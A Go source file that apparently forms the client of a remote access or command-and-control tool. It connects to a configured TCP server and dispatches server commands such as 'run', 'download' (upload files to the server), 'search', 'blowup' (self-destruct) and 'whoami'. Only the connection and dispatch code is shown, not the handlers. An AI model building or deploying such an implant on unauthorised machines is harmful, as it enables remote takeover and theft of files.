package connection

import (
	h "client/util/header"
	"fmt"
	"net"
	"strings"
	conf "client/util/config"
	"os"
	"strconv"
)

/*
* START CONNECTION TO TCP SERVER
host main connection on .env config
*/


//*Starting instance of the client
func (c *Client) ClientConnect(){
	HOST := conf.EnvVar("HOST")
	PORT := conf.EnvVar("PORT")
	TYPE := conf.EnvVar("TYPE")

    conn, err := net.Dial(TYPE, HOST+":"+PORT)
    if err != nil {
        fmt.Println(h.E, "Error connecting to server:", err)
        os.Exit(1)
    }
    defer conn.Close()

    fmt.Println(h.K, "Connected to server")

	buffer := make([]byte, 1024)

	bytesRead, err := conn.Read(buffer)
	if err != nil {
		fmt.Println(h.E, "Error reading data:", err)
		return
	}

	command := string(buffer[:bytesRead])
	
	parts := strings.Fields(command)
	if len(parts) == 0 {
		return
	}

	if parts[0] == "ID"{
		//*SET PROPERTIES
		c.setConn(conn)
		c.setOS()
		c.setID(parts[1])
	}

	go c.checkActive(5, c.Pause)
	c.Status <- true

	fmt.Println(h.Line)
	fmt.Println(h.I, "METADATA")
	fmt.Println(h.I, "Running:", c.OS)
	fmt.Println(h.I, "Connection:", c.Conn)
	fmt.Println(h.I, "ID:", c.ID)
	fmt.Println(h.Line)
    
	for {
        buffer := make([]byte, 2048)
        bytesRead, err := conn.Read(buffer)
        if err != nil {
            fmt.Println(h.E, "Error reading data:", err)
            break
        }

        command := string(buffer[:bytesRead])
		
		c.handleCommand(command, conn)
		
		c.Status <- true
    }
}

//*parses the command sent by the server
func (c *Client) handleCommand(command string, conn net.Conn){
	
	parts := strings.Fields(command)
	if len(parts) == 0 {
		fmt.Println(h.E, "invalid command from server")
		return
	}
	
	instr := &Command{
		CMD: parts[0],
		Action: "",
		Response: &Response{},
	}

	if len(parts) == 2{
		instr.Action = parts[1]

	}else if len(parts) > 2{
		instr.FileInfo.Name = parts[1]
		
		size, err := strconv.ParseInt(parts[2], 10, 64)
		if err != nil{
			return
		}
		
		instr.FileInfo.Size = size
	}

	switch {
		case len(instr.FileInfo.Name) > 1:
			fmt.Println(h.K, "Command received from server:", instr.CMD, instr.FileInfo.Name)
		default:
			fmt.Println(h.K, "Command received from server:", instr.CMD, instr.Action)
	}

	switch instr.CMD{
		case "ping":
			c.ping(instr)
		case "run":
			c.run(instr)
		case "send":
			c.ReceiveFileFromServer(instr)
		case "search":
			c.searchFile(instr)
		case "download":
			c.sendToServer(instr)
		case "entry":
			c.entryPoint(instr)
		case "blowup":
			c.selfDestruct(instr)
		case "metadata":
			c.sendMetadata(instr)
		case "echo":
			c.echo(instr)
		case "whoami":
			c.whoami(instr)
		default:
			fmt.Println(h.E, "Invalid command")
	}
	
	c.sendResponse(instr)
}